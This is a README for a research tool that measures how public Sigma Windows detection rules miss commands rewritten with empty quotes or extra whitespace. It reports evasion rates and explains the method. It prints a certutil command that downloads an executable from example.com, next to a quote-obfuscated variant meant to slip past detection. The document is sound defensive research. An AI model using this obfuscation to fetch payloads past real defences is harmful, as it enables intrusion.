# sigma-mutate

**Do the rules that detect cyberattacks still work when an attacker types the same command a
little differently?** For most public Windows detection rules, the answer is no. This project
measures it, rule by rule.

## The problem

Companies spot attacks on their computers with *detection rules*: small descriptions of
suspicious activity, such as "someone used the built-in tool `certutil` to download a file from
the internet". When a rule matches, the security team gets an alert.

Most of these rules work by looking for specific words in the command that was run. But Windows
accepts many spellings of the same command. These two lines do exactly the same thing:

```
certutil.exe -urlcache -f http://example.com/file.exe
certutil.exe -url""cache -f ht""tp://example.com/file.exe
```

Windows quietly removes the empty quotes `""` before running the command. A rule that looks for
the word `urlcache` sees the first line and raises an alert. It does not see the second one.
The attack runs the same way, without an alert.

## Why it matters

[Sigma](https://github.com/SigmaHQ/sigma) is the open, shared format for these rules. Its public
library holds thousands of rules written by the security community and is reused by companies
and security products around the world. If a rule can be bypassed by adding two quote
characters, the people relying on it are less protected than they think, and an attacker needs
no skill to get around it.

## What this project shows

sigma-mutate took every Windows rule of the public library that watches programs being started
(1,193 rules), built for each one a command it detects, rewrote that command in ways that do not
change what it does, and checked whether the rule still fired.

- **894 rules** could be tested automatically.
- **97%** of those that gave a clear answer (834 of 864) **missed at least one rewritten command**.
- With the strictest counting (only rules that have no other way to raise an alert, and only
  programs whose behaviour was checked on a real Windows machine), the figure is still **91%**
  (173 of 191).
- The rewritten commands were really run on Windows with 15 common programs: every rewrite the
  tool uses by default (193 of 193) gave exactly the same result as the original.
- The tool's verdicts were double-checked by an independent rule engine on 22,002 test events,
  with **no disagreement**.

Full figures and examples are in [RESULTS.md](RESULTS.md). The method and its limits are in
[METHODOLOGY.md](METHODOLOGY.md).

**What it does not show:** that these attacks go unnoticed everywhere. Companies usually have
other defences too. It shows that a large share of individual rules can be sidestepped with
trivial changes, which is a measurable, fixable weakness.

## How it works

1. **Build a test command** from each rule, since the public rules come without examples.
2. **Rewrite it** without changing what it does: empty quotes inside a word, quotes around a
   word, extra spaces, tabs.
3. **Check** whether the rule still detects each rewritten command.
4. **Verify the verifier**: the rewrites are run on a real Windows machine to prove they are
   equivalent, and an independent engine replays every test.

## Try it

Requires Python 3.10 or newer.

```bash
pip install -e .

# one rule, one event
sigma-mutate examples/certutil_rule.yml examples/certutil_event.json

# a whole folder of SigmaHQ rules, then the report
python scripts/corpus.py path/to/sigma/rules/windows/process_creation --verify-rsigma
python scripts/report.py
```

`--verify-rsigma` needs [rsigma](https://github.com/timescale/rsigma) on the PATH.
`scripts/validate_mutators.py` reruns the Windows validation (Windows only, harmless read-only
commands).

## License

MIT, see [LICENSE](LICENSE).
